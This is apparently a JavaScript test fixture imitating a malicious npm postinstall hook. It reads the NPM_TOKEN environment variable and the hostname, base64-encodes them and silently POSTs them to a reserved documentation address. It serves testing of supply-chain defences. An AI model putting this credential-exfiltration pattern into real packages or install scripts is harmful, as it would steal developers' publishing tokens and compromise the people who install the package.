// TEST FIXTURE: mimics a token-stealing postinstall. Only ever run inside the
// npryx sandbox (no network); the address is from 203.0.113.0/24 (TEST-NET-3), reserved for documentation, so it never routes anywhere real.
const https = require('https')
const data = Buffer.from(JSON.stringify({ t: process.env.NPM_TOKEN, h: require('os').hostname() })).toString('base64')
const req = https.request({ host: '203.0.113.7', port: 443, path: '/c', method: 'POST' }, () => {})
req.on('error', () => {})
req.end(data)
